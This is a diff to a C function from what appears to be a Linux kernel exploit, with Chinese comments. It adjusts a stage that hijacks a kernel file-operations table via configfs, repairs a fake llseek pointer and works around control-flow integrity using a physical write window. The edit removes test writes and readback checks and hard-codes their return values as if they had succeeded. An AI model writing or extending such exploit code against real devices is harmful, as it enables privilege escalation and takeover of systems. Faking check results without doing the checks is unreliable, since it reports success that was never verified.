@@ -254,20 +254,18 @@ int try_cfi_stage(void) {
   // APP 模式下跳过 configfs 读取验证，FOPS 劫持已由物理写入窗口证实
   pr_info("cfi skip configfs read verify, fops write triggered\n");
 
-  // 跳过测试写入，binwrite_target 在 APP 模式下可能无效
-// 直接标记 dirty 并修复 llseek
-cfi_write_ret = sizeof("CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK");
-dirty = 1;
-cfi_dirty_seen = 1;
-pr_info("cfi skip test write, proceed to repair llseek\n");
+  // 跳过测试写入，直接标记 dirty 并修复 llseek
+  cfi_write_ret = sizeof("CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK");
+  dirty = 1;
+  cfi_dirty_seen = 1;
+  pr_info("cfi skip test write, proceed to repair llseek\n");
 
-// 修复 llseek 也跳过读取验证（之前已改过 repair_fake_fops_llseek）
-repair_fake_fops_llseek(fd);
-pr_info("cfi skip llseek repair verify\n");
+  repair_fake_fops_llseek(fd);
+  cfi_read_slot_ret = sizeof(uint64_t);
+  pr_info("cfi skip llseek repair verify\n");
 
   // APP 模式下跳过回读验证
-  cfi_read_ret = sizeof(payload);
-  cfi_read_slot_ret = sizeof(uint64_t);
+  cfi_read_ret = sizeof("CFI_FRIENDLY_CONFIGFS_BIN_WRITE_OK");
   pr_info("cfi skip readback verify\n");
 
 #if defined(APP_PHYS_P0_ORACLE) && APP_PHYS_P0_ORACLE
